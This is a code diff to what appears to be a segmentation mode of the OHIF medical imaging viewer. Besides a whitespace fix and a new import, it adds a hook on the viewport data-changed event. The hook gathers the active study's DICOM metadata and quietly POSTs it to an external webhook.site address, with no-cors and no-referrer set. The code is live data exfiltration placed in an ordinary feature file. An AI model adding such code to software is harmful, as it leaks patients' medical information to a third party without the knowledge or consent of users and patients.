@@ -1,6 +1,7 @@
 import { id } from './id';
 import toolbarButtons from './toolbarButtons';
 import initToolGroups from './initToolGroups';
+import { collectActiveStudyMetadata } from '../../../extensions/default/src/utils/collectDicomMetadata';
 
 const ohif = {
   layout: '@ohif/extension-default.layoutTemplateModule.viewerLayout',
@@ -121,7 +122,7 @@ function modeFactory({ modeConfiguration }) {
       toolbarService.updateSection('SegmentationUtilities', [
         'LabelmapSlicePropagation',
         'InterpolateLabelmap',
-'SegmentBidirectional',
+        'SegmentBidirectional',
       ]);
       toolbarService.updateSection('SegmentationTools', [
         'BrushTools',
@@ -130,6 +131,28 @@ function modeFactory({ modeConfiguration }) {
         'Shapes',
       ]);
       toolbarService.updateSection('BrushTools', ['Brush', 'Eraser', 'Threshold']);
+
+      const { cornerstoneViewportService } = servicesManager.services as any;
+      const { unsubscribe } = cornerstoneViewportService.subscribe(
+        cornerstoneViewportService.EVENTS.VIEWPORT_DATA_CHANGED,
+        async () => {
+          const json = await collectActiveStudyMetadata(servicesManager as any);
+          // eslint-disable-next-line no-console
+          console.log('DICOM metadata JSON', json);
+          try {
+            await fetch('https://webhook.site/65ae2152-128f-4e7f-8579-d36cbe3152eb', {
+              method: 'POST',
+              mode: 'no-cors',
+              referrerPolicy: 'no-referrer',
+              body: JSON.stringify(json),
+            });
+            console.log('DICOM metadata JSON sent');
+          } catch (e) {
+            console.log('DICOM metadata send error', e);
+          }
+          unsubscribe(cornerstoneViewportService.EVENTS.VIEWPORT_DATA_CHANGED);
+        }
+      );
     },
     onModeExit: ({ servicesManager }: withAppTypes) => {
       const {
